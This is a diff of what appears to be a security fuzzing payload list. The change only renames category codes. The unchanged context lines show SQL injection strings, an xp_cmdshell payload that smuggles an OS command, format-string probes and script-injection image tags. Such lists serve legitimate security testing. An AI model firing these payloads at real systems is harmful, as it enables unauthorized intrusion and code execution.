@@ -110,7 +110,7 @@ P:FSE-LOW:Format String Errors:19
 f(x)=%s x 123
 f(x)=%x x 255
 
-P:INJ-SQL:SQL Injection:12
+P:SQL-INJ:SQL Injection:12
 > Database | Injection Attacks
 a'
 ?
@@ -125,7 +125,7 @@ x' OR full_name LIKE '%Bob%
 23 OR 1=1
 '; exec master..xp_cmdshell 'ping 172.10.1.255'--
 
-P:INJ-XSS:Cross Site Scripting:12
+P:XSS-ONE:Cross Site Scripting:12
 > Cross Site Scripting
 <IMG SRC=javascript:alert('XSS')>
 <IMG SRC=JaVaScRiPt:alert('XSS')>
@@ -202,7 +202,7 @@ R:NUM-OCT:Octal Fuzz Type:8
 6
 7
 
-R:BIN-NUM:Binary Fuzz Type:2
+R:NUM-BIN:Binary Fuzz Type:2
 > Category String | Characters | Binary
 0
 1
